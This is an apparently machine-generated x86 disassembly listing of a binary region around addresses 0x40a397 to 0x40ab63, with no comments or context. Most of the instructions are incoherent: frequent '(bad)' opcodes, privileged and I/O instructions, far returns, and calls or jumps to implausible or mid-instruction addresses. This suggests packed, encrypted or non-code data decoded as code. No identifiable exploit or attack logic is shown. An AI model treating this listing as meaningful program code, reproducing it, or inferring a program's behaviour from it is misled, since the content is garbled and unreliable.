  40a397:	loopne 0x40a369
  40a399:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40a39f:	add    BYTE PTR [ebx],dh
  40a3a1:	mov    ecx,ebx
  40a3a3:	hlt    
  40a3a4:	add    ecx,ebx
  40a3a6:	enter  0x899e,0x32
  40a3aa:	dec    ebp
  40a3ab:	add    ecx,eax
  40a3ad:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40a3b3:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40a3ba:	xor    ecx,ebx
  40a3bc:	retf   
  40a3bd:	enter  0x4d03,0xc8
  40a3c1:	mov    DWORD PTR fs:[eax],ebx
  40a3c4:	lea    eax,[eax]
  40a3c6:	push   esp
  40a3c7:	mov    edi,edi
  40a3c9:	fs (bad) 
  40a3cb:	(bad)  
  40a3cc:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40a3d2:	push   0xffffffff
  40a3d4:	and    bh,bh
  40a3d6:	pop    ecx
  40a3d7:	inc    eax
  40a3d8:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40a3de:	push   0xffffff8b
  40a3e0:	pop    ecx
  40a3e1:	cld    
  40a3e2:	dec    ebp
  40a3e3:	lea    ecx,[ecx+0x45ff08ff]
  40a3e9:	mov    BYTE PTR [edx+0x1],cl
  40a3ec:	add    BYTE PTR [eax],al
  40a3ee:	mov    DWORD PTR [ebp+0x8],0x58008d
  40a3f5:	dec    DWORD PTR [ebp-0x77]
  40a3f8:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40a3ff:	cld    
  40a400:	dec    ebp
  40a401:	jne    0x40a436
  40a403:	lea    eax,[ebx]
  40a405:	push   eax
  40a406:	mov    edi,edi
  40a408:	or     BYTE PTR [ecx+0x54a845],cl
  40a40e:	add    al,ch
  40a410:	(bad)  
  40a411:	sub    ebp,esp
  40a413:	add    BYTE PTR [eax],al
  40a415:	rol    BYTE PTR [eax],0x84
  40a418:	inc    ebp
  40a419:	add    dh,BYTE PTR [esi+0x0]
  40a41c:	add    BYTE PTR [ebp-0x73],al
  40a41f:	mov    ebp,DWORD PTR [esp+edx*4]
  40a422:	inc    DWORD PTR [eax]
  40a424:	lea    ecx,[ebx-0x30074f4]
  40a42a:	call   0x41afaf
  40a42f:	add    BYTE PTR [ebp+0x0],cl
  40a432:	jne    0x40a475
  40a434:	dec    DWORD PTR [ebx-0x76210314]
  40a43a:	dec    ebp
  40a43b:	add    DWORD PTR [ebp+0x0],esi
  40a43e:	(bad)  
  40a43f:	xchg   ebp,eax
  40a440:	loopne 0x40a441
  40a442:	inc    eax
  40a443:	inc    DWORD PTR [eax]
  40a445:	mov    ecx,DWORD PTR [ebp-0x4]
  40a448:	xor    edx,DWORD PTR [edx+0x7201b8]
  40a44e:	add    BYTE PTR [edx],dl
  40a450:	enter  0x4d90,0x0
  40a454:	mov    eax,DWORD PTR [eax]
  40a456:	hlt    
  40a457:	add    al,0xa5
  40a459:	mov    al,0xff
  40a45b:	add    bh,bh
  40a45d:	add    BYTE PTR [ebx],dh
  40a45f:	inc    DWORD PTR [ebx]
  40a461:	sbb    al,0x89
  40a463:	jne    0x40a43d
  40a465:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40a46b:	mov    eax,DWORD PTR [ebp-0xff0048]
  40a471:	mov    DWORD PTR [eax-0x70],0xee58e189
  40a478:	inc    DWORD PTR [ebp-0x75]
  40a47b:	ror    DWORD PTR [esp+ebp*8],1
  40a47e:	test   DWORD PTR [esi-0x1],esp
  40a481:	inc    ebp
  40a482:	(bad)  
  40a483:	aas    
  40a484:	inc    ebp
  40a485:	(bad)  
  40a486:	lea    edi,[esp+eiz*2-0x1]
  40a48a:	push   DWORD PTR [edi]
  40a48c:	mov    DWORD PTR [ecx],esi
  40a48e:	mov    al,ds:0x8b8000c7
  40a493:	out    dx,al
  40a494:	cld    
  40a495:	call   0xed3fea27
  40a49a:	(bad)  
  40a49b:	fisttp WORD PTR [eax+0x8801c7]
  40a4a1:	jmp    0x40a4e8
  40a4a3:	out    dx,al
  40a4a4:	inc    DWORD PTR [ebp-0x4]
  40a4a7:	xlat   BYTE PTR ds:[ebx]
  40a4a8:	lea    edi,[edi]
  40a4aa:	inc    edi
  40a4ac:	jmp    FWORD PTR [eax-0x78]
  40a4af:	inc    DWORD PTR [ecx]
  40a4b1:	aaa    
  40a4b2:	add    BYTE PTR [ecx],dh
  40a4b4:	pop    ecx
  40a4b5:	mov    DWORD PTR [eax],0xfff856c
  40a4bb:	ffreep st(5)
  40a4bd:	aas    
  40a4be:	add    bh,al
  40a4c0:	mov    esi,DWORD PTR [eax-0x4]
  40a4c3:	inc    DWORD PTR [eax+0xdf01ec]
  40a4c9:	(bad)  
  40a4ca:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40a4ce:	mov    esp,ebx
  40a4d0:	xchg   esp,eax
  40a4d1:	rol    DWORD PTR [eax],cl
  40a4d3:	(bad)  
  40a4d4:	mov    edi,DWORD PTR [eax+0x3]
  40a4d7:	(bad)  
  40a4d8:	cmp    al,0xd7
  40a4da:	dec    ebp
  40a4db:	lds    ecx,FWORD PTR [ebx+0x2ad8e8]
  40a4e1:	add    BYTE PTR [ebp-0x3b375],cl
  40a4e7:	adc    BYTE PTR [edx+0x1],0x55
  40a4eb:	add    BYTE PTR [ebx+0x6c8c30],cl
  40a4f1:	add    BYTE PTR [ebx-0x778afc7b],cl
  40a4f7:	mov    eax,DWORD PTR [eax]
  40a4f9:	cld    
  40a4fa:	push   0x7d
  40a4fc:	dec    DWORD PTR [ebx+0xd88c]
  40a502:	push   edx
  40a503:	mov    edx,DWORD PTR [ecx-0x4]
  40a506:	call   DWORD PTR [eax+0x7d01fc]
  40a50c:	mov    ecx,DWORD PTR [ebx+0x509000fc]
  40a512:	add    DWORD PTR [esi+0x0],edx
  40a515:	test   DWORD PTR [ebp+0x75],eax
  40a518:	call   0xc83d85a8
  40a51d:	jge    0x40a4b3
  40a51f:	mov    ebp,ebx
  40a521:	fcom   st(7)
  40a523:	add    bh,al
  40a525:	mov    ebx,DWORD PTR [eax-0x7a6f8304]
  40a52b:	add    edi,edi
  40a52d:	add    bh,bh
  40a52f:	imul   esp,ecx,0x4550d400
  40a535:	push   esi
  40a536:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40a53c:	test   BYTE PTR [ebx],dh
  40a53e:	aam    0x5
  40a540:	retf   0x4572
  40a543:	add    bl,ah
  40a545:	rcl    ebx,0x84
  40a548:	mov    DWORD PTR [ecx],0x46d1008c
  40a54e:	jl     0x40a550
  40a550:	test   edi,eax
  40a552:	jmp    esp
  40a554:	inc    DWORD PTR [eax]
  40a556:	loope  0x40a558
  40a558:	aam    0x75
  40a55a:	test   DWORD PTR [ebx+0x45fffcff],ecx
  40a560:	out    dx,al
  40a561:	mov    ebp,eax
  40a563:	mov    ah,0x85
  40a565:	add    bh,bh
  40a567:	call   0x114d06b
  40a56c:	retf   0x858b
  40a56f:	cld    
  40a570:	inc    DWORD PTR [eax+0xeb01ff]
  40a576:	out    dx,al
  40a577:	xor    BYTE PTR [ebp-0xff001e],al
  40a57d:	mov    edx,ecx
  40a57f:	cld    
  40a580:	jl     0x40a50b
  40a582:	mov    edx,0x50000001
  40a587:	add    DWORD PTR [ebp+0x45],eax
  40a58a:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40a590:	dec    DWORD PTR [ebx-0x3fd80318]
  40a596:	add    BYTE PTR [ebp-0xbf0040],dl
  40a59c:	inc    ebp
  40a59d:	xor    DWORD PTR [ebx-0x4faf0400],ecx
  40a5a3:	inc    ebp
  40a5a4:	add    DWORD PTR [ebx+0x459c00],ecx
  40a5aa:	mov    edi,edi
  40a5ac:	mov    eax,0xe80800ff
  40a5b1:	inc    ebp
  40a5b2:	sub    cl,BYTE PTR [ebx-0x47000400]
  40a5b8:	add    al,0x1
  40a5ba:	rol    BYTE PTR [eax],0x1e
  40a5bd:	jne    0x40a604
  40a5bf:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40a5c5:	inc    DWORD PTR [ecx]
  40a5c7:	call   0x85cfcc
  40a5cc:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40a5d2:	call   0x40cfd8
  40a5d7:	xor    bh,bh
  40a5d9:	push   edi
  40a5da:	adc    BYTE PTR [ebx-0x747423bb],al
  40a5e0:	loopne 0x40a5be
  40a5e2:	ret    
  40a5e3:	loopne 0x40a583
  40a5e5:	xor    DWORD PTR [edx],0x31
  40a5e8:	cmp    edi,edi
  40a5ea:	bswap  esp
  40a5ec:	rol    BYTE PTR gs:[eax],0x5
  40a5f0:	jmp    0x12ba73a
  40a5f5:	mov    eax,DWORD PTR [ebp-0x4]
  40a5f8:	add    BYTE PTR [eax+0xff0100],bh
  40a5fe:	cld    
  40a5ff:	jne    0x40a67e
  40a601:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40a607:	mov    DWORD PTR [ecx],0x30500000
  40a60d:	inc    ebp
  40a60e:	add    BYTE PTR [ebx+0x459850],cl
  40a614:	mov    edi,edi
  40a616:	test   al,0xff
  40a618:	add    BYTE PTR [eax],cl
  40a61a:	inc    DWORD PTR [ebp-0x18]
  40a61d:	jmp    DWORD PTR [esi]
  40a61f:	fadd   QWORD PTR [eax]
  40a621:	jge    0x40a670
  40a623:	adc    BYTE PTR [ebx+0x459cb9],cl
  40a629:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40a62f:	sahf   
  40a630:	mov    eax,0x30132
  40a635:	lea    esi,[ebp+0x2c]
  40a638:	xor    edi,edi
  40a63a:	(bad)  
  40a63b:	call   0x13fcfa8
  40a640:	call   0x134d0d0
  40a645:	jne    0x40a5d2
  40a647:	xor    edi,esp
  40a649:	add    eax,DWORD PTR [eax+0xc018d]
  40a64f:	push   DWORD PTR [eax]
  40a651:	call   0xc9cfad
  40a656:	int3   
  40a657:	inc    DWORD PTR [ebp-0x14]
  40a65a:	mov    ecx,DWORD PTR [ebp-0x28]
  40a65d:	xor    eax,DWORD PTR [eax]
  40a65f:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40a665:	(bad)  
  40a666:	xchg   ebp,eax
  40a667:	in     al,0xff
  40a669:	add    bh,bh
  40a66b:	add    BYTE PTR [esi],al
  40a66d:	inc    ebp
  40a66e:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  40a674:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff62]
  40a67b:	mov    edi,edi
  40a67d:	or     BYTE PTR [eax],cl
  40a67f:	inc    ebp
  40a680:	test   DWORD PTR gs:[eax],eax
  40a683:	je     0x40a6ca
  40a685:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40a68b:	xor    edx,DWORD PTR [eax-0x73]
  40a68e:	push   ebp
  40a68f:	or     BYTE PTR [ebp+0x21007572],al
  40a695:	inc    ebp
  40a696:	in     al,dx
  40a697:	mov    ebp,DWORD PTR [eax]
  40a699:	mov    esp,0x628bc345
  40a69e:	fmul   st,st(5)
  40a6a0:	add    BYTE PTR [ebx],ch
  40a6a2:	mov    eax,DWORD PTR [ebx]
  40a6a4:	cld    
  40a6a5:	loopne 0x40a667
  40a6a7:	inc    ebp
  40a6a8:	push   ebp
  40a6a9:	cmp    ebp,eax
  40a6ab:	movaps XMMWORD PTR [eax-0x74740100],xmm4
  40a6b2:	cld    
  40a6b3:	fadd   DWORD PTR [eax+0x3b014d]
  40a6b9:	jne    0x40a6eb
  40a6bb:	push   0xf8898557
  40a6c0:	in     al,dx
  40a6c1:	jne    0x40a708
  40a6c3:	lea    eax,[ebx+0x72e8dcc8]
  40a6c9:	xor    DWORD PTR [ebx+0x7545bc00],ecx
  40a6cf:	jmp    0x40a704
  40a6d1:	mov    edi,DWORD PTR [edi+0x4572bc]
  40a6d7:	xor    eax,edi
  40a6d9:	adc    DWORD PTR [ebp-0xcd0062],0x8b9231
  40a6e3:	rcl    BYTE PTR [eax-0x40],1
  40a6e6:	inc    ebp
  40a6e7:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40a6ef:	inc    ebp
  40a6f0:	xchg   ebp,eax
  40a6f1:	ud0    ebp,DWORD PTR [ebx]
  40a6f4:	inc    DWORD PTR [eax]
  40a6f6:	jl     0x40a76e
  40a6f8:	add    BYTE PTR [edx+0x1f558050],cl
  40a6fe:	mov    ecx,DWORD PTR [esp+esi*8]
  40a701:	inc    eax
  40a702:	retf   
  40a703:	inc    ebp
  40a704:	iret   
  40a705:	jb     0x40a6cf
  40a707:	mov    eax,DWORD PTR [edi]
  40a709:	enter  0x4545,0x1
  40a70d:	xor    eax,0x898b9c00
  40a712:	mov    esp,0x33344df0
  40a717:	pushf  
  40a718:	lea    ecx,[ecx+0x4d72e008]
  40a71e:	add    BYTE PTR [ebx],dh
  40a720:	inc    ebp
  40a721:	mov    DWORD PTR [ebx-0x3f611b4c],ecx
  40a727:	xor    dl,BYTE PTR [edx]
  40a729:	add    eax,DWORD PTR [ebp-0x77]
  40a72c:	mov    eax,esp
  40a72e:	fmul   DWORD PTR [ebp-0x3d]
  40a731:	xor    eax,DWORD PTR [ebx+eax*1+0x832899e]
  40a738:	mov    DWORD PTR [ebp-0x28],eax
  40a73b:	aad    0x45
  40a73d:	pushf  
  40a73e:	xor    eax,edi
  40a740:	mov    ecx,0xff858db0
  40a745:	clc    
  40a746:	enter  0x4d45,0x32
  40a74a:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40a751:	test   esi,edi
  40a753:	clc    
  40a754:	inc    DWORD PTR [ebp+0x45]
  40a757:	xor    BYTE PTR [ebx-0x3738f764],cl
  40a75d:	test   al,0x16
  40a75f:	test   DWORD PTR ds:0xff459cf8,esi
  40a765:	ds cld 
  40a767:	pushf  
  40a768:	inc    ebp
  40a769:	mov    edx,DWORD PTR [eax-0x28]
  40a76c:	outs   dx,DWORD PTR ds:[esi]
  40a76d:	push   ebp
  40a76e:	add    BYTE PTR [ebx],dh
  40a770:	mov    DWORD PTR [ebx],eax
  40a772:	sar    BYTE PTR [ebx],1
  40a774:	adc    BYTE PTR [edi],cl
  40a776:	dec    ebp
  40a777:	adc    al,0x8b
  40a779:	add    al,dl
  40a77b:	jmp    0x101a94b
  40a780:	jb     0x40a7cf
  40a782:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40a788:	xor    ecx,DWORD PTR [ebp+0x3b]
  40a78b:	xor    ecx,DWORD PTR [edi]
  40a78d:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40a791:	(bad)  
  40a793:	clc    
  40a794:	enter  0x8400,0x8b
  40a798:	pop    es
  40a799:	mov    al,0x0
  40a79b:	push   ebp
  40a79c:	push   cs
  40a79d:	xor    ecx,eax
  40a79f:	xor    esp,ecx
  40a7a1:	add    ebp,DWORD PTR [eax]
  40a7a3:	add    esi,DWORD PTR [eax]
  40a7a5:	(bad)  
  40a7a7:	retf   0x55c8
  40a7aa:	repnz mov eax,DWORD PTR [ebp-0x10]
  40a7ae:	(bad)  
  40a7af:	cli    
  40a7b0:	fdivr  st,st(1)
  40a7b2:	test   DWORD PTR [eax+edi*8],ecx
  40a7b5:	dec    ebp
  40a7b6:	inc    ebp
  40a7b7:	xor    edi,DWORD PTR [eax-0x7167afd]
  40a7bd:	add    BYTE PTR [ebp+0x0],al
  40a7c0:	mov    ecx,DWORD PTR [ebp-0x28]
  40a7c3:	mov    ecx,ebx
  40a7c5:	clc    
  40a7c6:	jne    0x40a793
  40a7c8:	mov    esi,0xd672d3
  40a7cd:	into   
  40a7ce:	into   
  40a7cf:	scas   eax,DWORD PTR es:[edi]
  40a7d0:	dec    ebp
  40a7d1:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40a7d7:	sub    ecx,esi
  40a7d9:	cmp    ecx,DWORD PTR [ebp+0x77]
  40a7dc:	(bad)  
  40a7dd:	mov    edi,eax
  40a7df:	mov    al,0x85
  40a7e1:	mov    eax,edi
  40a7e3:	add    BYTE PTR [ebp-0x75],al
  40a7e6:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40a7ed:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40a7f3:	rdtsc  
  40a7f5:	retf   0x559c
  40a7f8:	(bad)  
  40a7f9:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40a800:	inc    ebp
  40a801:	add    eax,0xeb9c4d3f
  40a806:	(bad)  
  40a807:	mov    ecx,esp
  40a809:	lods   al,BYTE PTR ds:[esi]
  40a80a:	test   DWORD PTR [ebp-0x8],edx
  40a80d:	xor    ecx,DWORD PTR [ebp+0x33]
  40a810:	mov    eax,DWORD PTR [ebx]
  40a812:	lock add ecx,ebx
  40a815:	bswap  esi
  40a817:	retf   0x55d1
  40a81a:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40a820:	jmp    0x40a81b
  40a822:	add    BYTE PTR ds:0xebc44d8b,al
  40a828:	push   ebp
  40a829:	mov    ebp,DWORD PTR [ebx]
  40a82b:	test   al,0x8b
  40a82d:	push   ebp
  40a82e:	clc    
  40a82f:	xor    ecx,ebx
  40a831:	xor    ecx,esi
  40a833:	add    edx,ecx
  40a835:	add    eax,DWORD PTR [edx+0xca010f]
  40a83b:	push   ebp
  40a83c:	dec    ebp
  40a83d:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40a843:	stc    
  40a844:	rol    DWORD PTR ds:0xebce4dd6,cl
  40a84a:	scas   eax,DWORD PTR es:[edi]
  40a84b:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40a851:	xor    ebp,DWORD PTR [ebx]
  40a853:	xor    edi,DWORD PTR [ebx]
  40a855:	add    esi,DWORD PTR [edi+0x3]
  40a858:	mov    ecx,DWORD PTR [edi]
  40a85a:	clc    
  40a85b:	retf   0x55cb
  40a85e:	into   
  40a85f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40a866:	mov    eax,0x3376554d
  40a86b:	mov    esi,DWORD PTR [ebx]
  40a86d:	int3   
  40a86e:	add    edx,DWORD PTR [ebp+0x3]
  40a871:	xor    ecx,DWORD PTR [edi]
  40a873:	xor    ecx,edx
  40a875:	add    edx,DWORD PTR [ebp+0x3]
  40a878:	mov    ecx,DWORD PTR [edi]
  40a87a:	lock retf 0x4dfa
  40a87e:	stc    
  40a87f:	mov    ecx,DWORD PTR [eax]
  40a881:	or     BYTE PTR [ebp+0x4d],cl
  40a884:	jmp    0x104a914
  40a889:	dec    ebp
  40a88a:	dec    ebp
  40a88b:	(bad)  
  40a88c:	mov    ebx,esp
  40a88e:	clc    
  40a88f:	test   ebx,ecx
  40a891:	clc    
  40a892:	ror    DWORD PTR [ebp-0x2a],cl
  40a895:	mov    esi,ecx
  40a897:	call   0x33cbee4b
  40a89c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40a8a3:	retf   
  40a8a4:	ja     0x40a874
  40a8a6:	mov    ebp,DWORD PTR [eax-0x48]
  40a8a9:	dec    ebp
  40a8aa:	xor    ecx,DWORD PTR [di+0x3]
  40a8ae:	mov    esp,esp
  40a8b0:	clc    
  40a8b1:	push   ebp
  40a8b2:	retf   
  40a8b3:	mov    dl,bl
  40a8b5:	adc    esi,edx
  40a8b7:	jb     0x40a887
  40a8b9:	add    BYTE PTR [edi-0x3b7474b3],ch
  40a8bf:	call   0x4d6c7441
  40a8c4:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40a8ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8cb:	sahf   
  40a8cc:	inc    ebp
  40a8cd:	xor    cl,BYTE PTR [ebp-0x78]
  40a8d0:	mov    edx,edi
  40a8d2:	clc    
  40a8d3:	dec    ebp
  40a8d4:	retf   
  40a8d5:	mov    edx,ebx
  40a8d7:	call   0x560f7cb2
  40a8dc:	scas   eax,DWORD PTR es:[edi]
  40a8dd:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40a8e3:	sahf   
  40a8e4:	sub    esi,DWORD PTR [edx]
  40a8e6:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40a8ec:	lods   al,BYTE PTR ds:[esi]
  40a8ed:	xor    esp,DWORD PTR [ebx]
  40a8ef:	add    ecx,DWORD PTR [ebp-0x1c]
  40a8f2:	mov    edi,DWORD PTR [ebp-0x8]
  40a8f5:	mov    bl,cl
  40a8f7:	cmp    dl,bl
  40a8f9:	jb     0x40a8c9
  40a8fb:	add    dh,dl
  40a8fd:	dec    ebp
  40a8fe:	scas   eax,DWORD PTR es:[edi]
  40a8ff:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40a905:	shr    DWORD PTR [ebx],cl
  40a907:	into   
  40a908:	cmp    edx,esi
  40a90a:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40a910:	dec    ebp
  40a911:	dec    ebp
  40a912:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40a918:	retf   
  40a919:	xor    edx,esi
  40a91b:	add    ecx,esi
  40a91d:	imul   ecx,edx
  40a920:	mov    DWORD PTR [ebp+0x8],edx
  40a923:	xor    ecx,DWORD PTR [ebp+0x2b]
  40a926:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40a92c:	add    esi,DWORD PTR [ebx]
  40a92e:	mov    ah,0x3
  40a930:	inc    ebp
  40a931:	sysexit 
  40a933:	xlat   BYTE PTR ds:[ebx]
  40a934:	pushf  
  40a935:	jge    0x40a8c0
  40a937:	xor    ebx,eax
  40a939:	sub    eax,DWORD PTR [ebp-0x73]
  40a93c:	(bad)  
  40a93d:	cmp    al,al
  40a93f:	jb     0x40a8c6
  40a941:	add    al,bh
  40a943:	ror    DWORD PTR [ebp-0x7a],1
  40a946:	xor    edi,edi
  40a948:	add    edi,edi
  40a94a:	jmp    0x40a999
  40a94c:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40a952:	dec    ebp
  40a953:	into   
  40a954:	mov    ebp,DWORD PTR [edi-0x23737428]
  40a95a:	sahf   
  40a95b:	shl    DWORD PTR [edx],cl
  40a95d:	retf   0x5588
  40a960:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40a966:	add    eax,DWORD PTR [eax]
  40a968:	in     al,0x4d
  40a96a:	push   ebp
  40a96b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40a971:	bound  eax,QWORD PTR [eax]
  40a973:	int    0x4d
  40a975:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40a97b:	dec    ebp
  40a97c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40a982:	jge    0x40a952
  40a984:	mov    BYTE PTR [edi+0xf723b3a],ch
  40a98a:	add    cl,dh
  40a98c:	dec    ebp
  40a98d:	dec    DWORD PTR [ebx-0x2c032375]
  40a993:	adc    BYTE PTR [ebp+0x1],0x8b
  40a997:	add    al,bl
  40a999:	jge    0x40a927
  40a99b:	push   0xffffff9e
  40a99d:	push   0x8b3032
  40a9a2:	shl    BYTE PTR [ebp+0x55],0x6a
  40a9a6:	xor    edi,edi
  40a9a8:	xor    edx,DWORD PTR [ebx+eax*1]
  40a9ab:	inc    ebp
  40a9ac:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40a9b2:	dec    ebp
  40a9b3:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40a9b9:	jbe    0x40a946
  40a9bb:	mov    ebp,esp
  40a9bd:	ror    bl,1
  40a9bf:	enter  0x14ce,0xaf
  40a9c3:	dec    DWORD PTR [ebx-0x2cef17f8]
  40a9c9:	push   ebp
  40a9ca:	retf   0x5540
  40a9cd:	push   ebp
  40a9ce:	mov    esi,DWORD PTR [edx-0x1c]
  40a9d1:	mov    edx,ebx
  40a9d3:	cld    
  40a9d4:	(bad)  
  40a9d5:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40a9dc:	sti    
  40a9dd:	add    dh,cl
  40a9df:	push   0xffffff94
  40a9e1:	call   FWORD PTR [esi+0x3b5032d0]
  40a9e7:	mov    ecx,DWORD PTR [edi]
  40a9e9:	int3   
  40a9ea:	pop    esi
  40a9eb:	inc    ebp
  40a9ec:	dec    DWORD PTR [ecx+0x45e8c88b]
  40a9f2:	push   ebp
  40a9f3:	xor    esi,DWORD PTR [ebx]
  40a9f5:	mov    DWORD PTR [ebx],0xcacc0f9c
  40a9fb:	aas    
  40a9fc:	push   ebp
  40a9fd:	inc    ebp
  40a9fe:	xor    eax,esp
  40aa00:	add    eax,esp
  40aa02:	mov    eax,DWORD PTR [ebx]
  40aa04:	(bad)  
  40aa05:	jmp    0x40a993
  40aa07:	mov    bl,BYTE PTR [esi-0x7674cdfb]
  40aa0d:	rol    ah,1
  40aa0f:	mov    esi,0xf133104d
  40aa14:	mov    edx,0xff358d80
  40aa19:	mov    dh,0xd1
  40aa1b:	cmp    edx,DWORD PTR [ebp+0xf]
  40aa1e:	mov    eax,DWORD PTR [edx-0x20]
  40aa21:	add    BYTE PTR [ebp-0x75],bh
  40aa24:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40aa2b:	sahf   
  40aa2c:	retf   0x8632
  40aa2f:	cmp    ebp,0x8
  40aa32:	call   ebx
  40aa34:	inc    ebp
  40aa35:	inc    ebp
  40aa36:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40aa3c:	mov    esi,DWORD PTR ds:0xc7049cc8
  40aa42:	add    al,al
  40aa44:	add    bl,al
  40aa46:	(bad)  
  40aa47:	clc    
  40aa48:	enter  0x45,0x35
  40aa4c:	push   eax
  40aa4d:	pushf  
  40aa4e:	mov    edi,eax
  40aa50:	int3   
  40aa51:	or     al,al
  40aa53:	test   DWORD PTR [edi],edi
  40aa55:	clc    
  40aa56:	gs inc ebp
  40aa58:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40aa5e:	push   ss
  40aa5f:	xor    ecx,DWORD PTR [ebp+0x3]
  40aa62:	sub    edx,DWORD PTR [ecx-0x76]
  40aa65:	dec    ebp
  40aa66:	add    DWORD PTR [ebx+0x88d845],ecx
  40aa6c:	mov    esi,DWORD PTR [ebx]
  40aa6e:	or     BYTE PTR [ebx],al
  40aa70:	cmp    edx,DWORD PTR [ecx-0x38]
  40aa73:	dec    ebp
  40aa74:	out    dx,eax
  40aa75:	xor    eax,DWORD PTR [ebp+0x3]
  40aa78:	mov    edx,DWORD PTR [ecx-0x28]
  40aa7b:	dec    ebp
  40aa7c:	add    BYTE PTR [ebx],dh
  40aa7e:	push   0x518003
  40aa83:	push   eax
  40aa84:	add    BYTE PTR [ebx-0x300748b],cl
  40aa8a:	sbb    BYTE PTR [ebp+0x45],cl
  40aa8d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40aa93:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40aa99:	dec    ebp
  40aa9a:	inc    ebp
  40aa9b:	xor    eax,esp
  40aa9d:	add    eax,esp
  40aa9f:	push   ecx
  40aaa0:	(bad)  
  40aaa1:	dec    ebp
  40aaa2:	mov    al,ds:0xc9e031ff
  40aaa7:	retf   
  40aaa8:	(bad)  
  40aaa9:	into   
  40aaaa:	sub    bh,bh
  40aaac:	dec    esp
  40aaad:	adc    al,0x9c
  40aaaf:	inc    ebp
  40aab0:	push   ebp
  40aab1:	test   DWORD PTR [edi],ecx
  40aab3:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab6ff80]
  40aaba:	jmp    0xc9b9b9ce
  40aabf:	add    cl,dl
  40aac1:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40aacb:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40aad1:	rol    BYTE PTR [eax],0x57
  40aad4:	clc    
  40aad5:	bound  esi,QWORD PTR [edx+0x7]
  40aad8:	mov    eax,DWORD PTR [ebp-0x30]
  40aadb:	xor    al,0x40
  40aadd:	sub    al,0xc7
  40aadf:	mov    ah,ch
  40aae1:	add    DWORD PTR [ebp+0x4534f845],eax
  40aae7:	sub    al,0x86
  40aae9:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40aaf0:	mov    ch,0xff
  40aaf2:	clc    
  40aaf3:	add    DWORD PTR [ebp+0x60],0x31
  40aaf7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40aafe:	inc    ebp
  40aaff:	dec    DWORD PTR [ebx-0x341ff701]
  40ab05:	test   esi,ecx
  40ab07:	dec    DWORD PTR [ebx-0x7f8a3301]
  40ab0d:	push   eax
  40ab0e:	add    DWORD PTR [ebp+0x0],eax
  40ab11:	dec    ebx
  40ab13:	or     al,0xce
  40ab15:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40ab1c:	into   
  40ab1d:	add    BYTE PTR [ebx-0x34ff1400],cl
  40ab23:	mov    esi,ecx
  40ab25:	sar    bh,0x45
  40ab28:	adc    al,0x8b
  40ab2a:	clc    
  40ab2b:	fadd   DWORD PTR [ebp+0x0]
  40ab2e:	mov    ebp,DWORD PTR [edx+0x8]
  40ab31:	push   edi
  40ab32:	adc    BYTE PTR [eax+0x1],0x83
  40ab36:	add    al,al
  40ab38:	retf   
  40ab39:	mov    ecx,esi
  40ab3b:	cld    
  40ab3c:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40ab42:	into   
  40ab43:	add    BYTE PTR [ebx+0x756aec00],cl
  40ab49:	jne    0x40ab7e
  40ab4b:	inc    DWORD PTR [ebx]
  40ab4d:	rcl    BYTE PTR [ecx+0x50],1
  40ab50:	push   eax
  40ab51:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40ab57:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40ab5e:	sar    bh,0x84
  40ab61:	or     BYTE PTR [ebx],al
  40ab63:	push   eax
